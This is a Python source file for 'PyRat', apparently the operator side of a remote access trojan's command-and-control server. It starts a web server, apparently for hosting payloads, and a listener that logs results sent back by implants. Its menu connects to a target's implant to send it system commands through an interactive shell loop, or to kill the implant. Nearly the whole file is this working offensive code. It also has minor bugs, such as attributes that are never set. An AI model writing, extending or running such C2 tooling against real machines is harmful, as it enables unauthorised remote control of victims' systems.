import os
import sys
import socket
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler

class Server:
    """
    A class to represent a Commaand & Control (C2) Server

    Attributes
    ----------
    logfile : file handle
        Used to block stderr from being printed to screen
    threads : list of Thread objects
        Used to hold the server worker threads
    web_thread : Thread object
        Used to handle the execution of the web_task method
    server_thread : Thread object
        Used to handle the execution of the server_thread method
    menu_thread : Thread object
        Used to handle the execution of the menu method

    Methods
    -------
    menu()
        Provides a user interface for the C2 server
    web_task(HOST, WEB_PORT=8000)
        Starts a webserver on socket http://HOST:WEB_PORT
        Default port is TCP/8000
    implant_task_socket(OPTION="TASK")
        Method to provide a shell to task commands on the remote client
        OPTION can be "TASK" or "KILL"
    server_listen(HOST,PORT)
        Main Server method, creates a listener to accept client communications

    """

    def __init__(self,ADDR,PORT,WEB_PORT=8000):
        """
        Parameters
        ----------
        ADDR : str
            String representing the desired listening address : "127.0.0.1"
        PORT : int
            Integer port number for the server to listen on
        WEB_PORT : int (Optional)
            Optional integer port for the server to start a webserver on.
            Default is TCP/8000
        """
        logfile = open("./connection-log",'a')
        sys.stderr = logfile

        self.ADDR = ADDR
        self.PORT = PORT
        self.WEB_PORT = WEB_PORT
        threads = []

        web_thread = Thread(target=self.web_task,args=(self.ADDR,self.WEB_PORT))
        threads.append(web_thread)
        web_thread.start()

        server_thread = Thread(target=self.server_listen,args=(self.ADDR,self.PORT))
        threads.append(server_thread)
        server_thread.start()

        menu_thread = Thread(target=self.menu())
        threads.append(menu_thread)
        menu_thread.start()

    def __del__(self):
        self.logfile.close()
        for t in self.threads:
            t.join()
          
    def menu (self):
        """
        Parameters
        ----------
        None. 
        Class constructor handles calling menu method

        Provides a menu for the user to select the desired function.
        Connecting to a remote client allows tasking for system commands.
        Killing the remote implant causes the remote client to stop running.
        When exiting the menu, the user is prompted to whether they wish to kill the client

        """
        print("     ____        ____  ___  ______")
        print("    / __ \__  __/ __ \/   |/_  __/")
        print("   / /_/ / / / / /_/ / /| | / /   ")
        print("  / ____/ /_/ / _, _/ ___ |/ /    ")
        print(" /_/    \__, /_/ |_/_/  |_/_/     ")
        print("       /____/                    ")
        print("                                  ")
        print("-- SERVER INFORMATION-- :")
        print(f"[+] SERVER IP: {self.ADDR}")
        print(f"[+] SERVER PORT: {self.PORT}")
        print(f"[+] SERVER WEB PORT: {self.WEB_PORT}")
        print("-------------------------------------")
        
        while True:
            print("PyRat Options: \n1. Connect to Shell\n2. Kill Remote Implant\n\n3. Exit Server\n")
            opt = input("Choose your option: ")
            if opt == '1':
                self.implant_task_socket("TASK")
            elif opt == '2':
                self.implant_task_socket("KILL")
            elif opt == '3':
                die = input(f"Would you like to kill a client(Y/N): ")
                if die[0].upper() == "Y":
                    self.implant_task_socket("KILL")
                    os.kill(os.getpid(),9)
                else:
                    os.kill(os.getpid(),9)          

    def web_task(self, HOST,WEB_PORT=8000):
        """
        Parameters
        ----------
        HOST : str
            String representation of the desired address to start the webserver on.
        PORT : int (Optional)
            Optional integer for the port number to start the webserver on
            Default is TCP/8000
        """

        http_socket = HTTPServer((HOST,WEB_PORT),SimpleHTTPRequestHandler)
        http_socket.serve_forever()

    def implant_task_socket(self, OPTION="TASK"):
        """
        Parameters
        ----------
        OPTION : str
            Optional argument to determing remote implant function
            TASK : Task the remote implant
            KILL : Kill (stop) the remote implant
        
        The method will loop indefinitely while the user issues system commands
        to the remote client.
        """

        print("Enter the target address: ")
        addr = input("")
        print("Enter the target port: ")
        port = int(input(""))
        print(f"Connecting to {addr}:{port}")
        
        cmd = ""
        CLIENT = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        CLIENT.connect((addr,port))
        if OPTION == "TASK":
            CLIENT.send(b"TASK")
            print(CLIENT.recv(1024).decode())
            
            while cmd.upper() != "QUIT":
                cmd = input("<-- ")
                CLIENT.send(cmd.encode())
                print(CLIENT.recv(1024).decode())
                CLIENT.send(b"TASK")
                print(CLIENT.recv(1024).decode())
            CLIENT.close()
        elif OPTION == "KILL":
            CLIENT.send(b"KILL")
            print(CLIENT.recv(1024).decode())

    def server_listen(self,HOST,PORT):
        """
        Parameters
        ----------
        HOST : str
            String representation of the address the server will listen on : "127.0.0.1"
        PORT : int
            Integer representation of the port the server will listen on

        The server will accept a client connection and open a file handle to write 
        completed task results in.
        """

        SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        SERVER.bind((HOST,PORT))
        SERVER.listen()
        while True:
            client,client_addr = SERVER.accept()
            if os.path.exists("task-completed.txt"):
                FH_RESULTS = open("task-completed.txt",'a')
            else:
                FH_RESULTS = open("task-completed",'w')
            msg = client.recv(1024)
            FH_RESULTS.write(msg.decode())
            FH_RESULTS.close()
